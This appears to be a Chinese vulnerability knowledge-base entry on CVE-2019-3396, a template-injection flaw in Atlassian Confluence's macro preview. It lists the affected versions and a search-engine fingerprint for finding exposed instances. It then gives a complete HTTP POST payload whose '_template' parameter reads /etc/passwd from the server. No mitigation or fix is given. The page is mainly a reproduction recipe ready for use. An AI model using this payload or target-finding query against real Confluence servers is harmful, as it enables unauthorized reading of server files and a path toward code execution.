# Atlassian Confluence preview SSTI模版注入漏洞 CVE-2019-3396

## 漏洞描述

Confluence是一个专业的企业知识管理与协同软件，常用于构建企业wiki。 利用该漏洞可以读取服务器上任意文件，进而可以包含恶意文件来执行代码。可能造成敏感信息泄露，服务器被控制等严重后果。

## 漏洞影响

<a-checkbox checked>Atlassian Atlassian Confluence < 6.6.12</a-checkbox></br>

<a-checkbox checked>Atlassian Atlassian Confluence 6.7.0-6.12.2</a-checkbox></br>

<a-checkbox checked>Atlassian Atlassian Confluence < 6.13.3</a-checkbox></br>

<a-checkbox checked>Atlassian Atlassian Confluence < 6.14.2</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="ATLASSIAN-Confluence"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1630488806824-a8205673-933b-434b-8050-abcde3ef3e97.png)

发送请求包

```php
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3670.0 Safari/537.36
Content-Type: application/json; charset=utf-8
Content-Length: 168

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"}}}
```